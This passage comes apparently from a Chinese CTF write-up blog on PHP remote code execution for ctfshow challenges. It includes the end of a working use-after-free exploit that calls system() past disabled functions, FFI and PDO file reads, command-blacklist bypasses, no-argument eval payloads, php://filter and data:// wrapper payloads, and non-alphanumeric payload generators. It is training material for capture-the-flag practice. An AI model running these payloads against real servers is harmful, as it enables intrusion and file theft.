class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br></pre></td></tr></table></figure><blockquote><p>需要通过url编码</p><p>当上面脚本<code>strlen()</code>被禁用的时候,自己写一个函数替代</p><p><code>strlen()</code> 返回指定字符串的长度</p><p>替换思路：把字符串转换成数组，读取数组长度</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strlen_user</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> count(str_split(<span class="variable">$s</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>报了内存溢出错误，换一种方法</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strlen_user</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$n</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= INF;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]!==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$n</span>++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$n</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> strlen_user(<span class="string">&#x27;flagc.txt&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="PDO连接"><a href="#PDO连接" class="headerlink" title="PDO连接"></a>PDO连接</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;getMessage();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><blockquote><p>需要知道数据库名称，用户名，密码</p></blockquote><h3 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//没有回显的</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br></pre></td></tr></table></figure><blockquote><p>php7.4以上才有</p></blockquote><h2 id="已定义变量-数组操作"><a href="#已定义变量-数组操作" class="headerlink" title="已定义变量+数组操作"></a>已定义变量+数组操作</h2><p><code>get_defined_vars()</code>返回所有已定义变量所组成的数组</p><h4 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h4><p><code>end()</code>:数组指针指向最后一位</p><p><code>next()</code>: 数组指针指向下一位</p><p><code>array_reverse()</code>: 将数组颠倒</p><p><code>array_rand()</code>: 随机返回数组的键名</p><p><code>array_flip()</code>：交换数组的键和值</p><p><code>array_pop()</code>：删除数组最后一个值并且弹出</p><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><h3 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h3><p><code>%0a</code>换行执行</p><p><code>%09</code>代替 TAB键（php可用）</p><h3 id="IFS-用在shell中"><a href="#IFS-用在shell中" class="headerlink" title="${IFS} 用在shell中"></a>${IFS} 用在shell中</h3><p><code>$&#123;PS2&#125;</code> 对应字符 <code>&gt;</code><br><code>$&#123;PS4&#125;</code> 对应字符 <code>+</code><br><code>$&#123;IFS&#125;</code> 对应 内部字段分隔符 同<code>$IFS</code><br><code>$&#123;9&#125;</code> 对应 空字符串</p><h3 id="nl带行号读"><a href="#nl带行号读" class="headerlink" title="nl带行号读"></a>nl带行号读</h3><p><code>nl&lt;fl&quot;&quot;ag.php||</code> 后续不能用<code>?*</code>通配符</p><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h3 id="glob通配符绕过"><a href="#glob通配符绕过" class="headerlink" title="glob通配符绕过"></a>glob通配符绕过</h3><p><code>?</code>代表1个字符</p><p><code>*</code>代表0个及以上任意字符</p><p>通配之后无法确定命令，可用绝对路径</p><p><code>?c=/bin/?at$&#123;IFS&#125;f???????</code></p><h3 id="单引号、双引号"><a href="#单引号、双引号" class="headerlink" title="单引号、双引号"></a>单引号、双引号</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c<span class="string">&quot;&quot;</span>at flag</span><br><span class="line">c<span class="string">&quot;&quot;</span>at fl<span class="string">&quot;&quot;</span>ag</span><br><span class="line">c<span class="string">&quot;&quot;</span>at fl<span class="string">&#x27;&#x27;</span>ag</span><br><span class="line"><span class="keyword">echo</span> `nl fl<span class="string">&quot;&quot;</span>ag.php`;</span><br></pre></td></tr></table></figure><h3 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure><h3 id="拼接"><a href="#拼接" class="headerlink" title="$拼接"></a><code>$</code>拼接</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">执行ls命令：</span><br><span class="line">a=l;b=s;$a<span class="variable">$b</span></span><br><span class="line">cat hello文件内容：</span><br><span class="line">a=c;b=at;c=he;d=llo;$a<span class="variable">$b</span> $&#123;c&#125;$&#123;d&#125;</span><br></pre></td></tr></table></figure><h2 id="无参数绕过-没有过滤分号-和括号"><a href="#无参数绕过-没有过滤分号-和括号" class="headerlink" title="无参数绕过-没有过滤分号;和括号("></a>无参数绕过-没有过滤分号<code>;</code>和括号<code>(</code></h2><h3 id="货币提取-扫描文件"><a href="#货币提取-扫描文件" class="headerlink" title="货币提取.扫描文件"></a>货币提取<code>.</code>扫描文件</h3><h4 id="过滤代码"><a href="#过滤代码" class="headerlink" title="过滤代码"></a>过滤代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;]))</code></p><p>过滤了<code>data://</code>,<code>filter://</code>,<code>php://</code>,<code>phar://</code>且忽略大小写，过滤了伪协议。</p><p><code>if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]))</code></p><p><code>(?R)</code>表示引用当前表达式，后面加了?表示递归。将匹配到的内容替换为空判断是否等于<code>;</code>等于再进入下一步判断。</p><p><code>if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;]))</code></p><h4 id="扫描当前目录"><a href="#扫描当前目录" class="headerlink" title="扫描当前目录"></a>扫描当前目录</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><blockquote><p><code>localeconv()</code>函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></p><p><code>pos()</code>和<code>current()</code>一样，返回数组中的当前值，初始化时会指向该数组中的第一个值。</p><p><code>scandir()</code>列出指定路径中的文件和目录,<code>scandir(&#39;.&#39;)</code>扫描当前目录。</p></blockquote><p>假设当前目录数组是这样的<code>Array (    [0] =&gt; .    [1] =&gt; ..    [2] =&gt; flag.php    [3] =&gt; index.php )</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><blockquote><p><code>array_reverse()</code>反转数组后<code>next()</code>指针向下一位</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><blockquote><p><code>array_flip()</code>交换键和值，<code>array_rand()</code>随机返回键名</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><blockquote><p><code>session_start()</code>启动新会话或者重用现有会话</p><p><code>session_id()</code>可以用来获取/设置 当前会话 ID</p><p>更改<code>Cookie: PHPSESSID=flag.php;</code></p></blockquote><h3 id="session绕过"><a href="#session绕过" class="headerlink" title="session绕过"></a>session绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=session_start();system(session_id());</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210912135728066.png" alt="image-20210912135728066"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210912135933297.png" alt="image-20210912135933297"></p><h2 id="传参逃逸-伪协议绕过-bypass分号-和括号"><a href="#传参逃逸-伪协议绕过-bypass分号-和括号" class="headerlink" title="传参逃逸+伪协议绕过-bypass分号;和括号("></a>传参逃逸+伪协议绕过-bypass分号<code>;</code>和括号<code>(</code></h2><mark class="hl-label orange">注意</mark> eval内如果要RCE必须以分号结尾，但是php最后一条语句可以没有分号。<blockquote><p><code>eval(&quot;echo 1;&quot;);</code>和<code>eval(&quot;echo 1?&gt;&quot;);</code>结果相同</p></blockquote><p>同时过滤了分号和括号，只能使用<strong>语言结构</strong>了，常见的语言结构：<code>echo,print,isset,unset,include,require</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$a</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>]<span class="meta">?&gt;</span>&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210911201022698.png" alt="image-20210911201022698"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">0</span>]<span class="meta">?&gt;</span>&amp;<span class="number">0</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span>%<span class="number">09</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data://text/plain,"></a>data://text/plain,</h3><p>数据流封装器,当<code>allow_url_include </code>打开的时候，任意文件包含就会成为任意命令执行</p><blockquote><p>PHP.ini：</p><p>data://协议必须双在on才能正常使用；</p><p>allow_url_fopen ：on</p><p>allow_url_include：on</p><p>php 版本大于等于 php5.2</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&quot;ipconfig&quot;) <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>两个斜杠可以省略</p></blockquote><h2 id="无数字，字母，-命令执行"><a href="#无数字，字母，-命令执行" class="headerlink" title="无数字，字母，$命令执行"></a>无数字，字母，<code>$</code>命令执行</h2><h3 id="取反获取数字"><a href="#取反获取数字" class="headerlink" title="取反获取数字"></a>取反获取数字</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# echo $(())</span><br><span class="line">0</span><br><span class="line">[root@localhost ~]# echo ~$(())</span><br><span class="line">~0</span><br><span class="line">[root@localhost ~]# echo $((~$(())))</span><br><span class="line">-1</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">######################################################</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">((~$(())))往中间每加一个$((~$(())))都加以1，先减后取反</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">######################################################</span></span></span><br><span class="line">[root@localhost ~]# echo $((~$(($((~$(())))+$((~$(())))))))</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="或运算绕过"><a href="#或运算绕过" class="headerlink" title="或运算绕过"></a>或运算绕过</h3><p><code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用，过滤了字母和数字但是没有过滤运算符<code>|</code></p><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">ctfshow web入门 web41</a></p><p>rce_or.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>php或运算.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 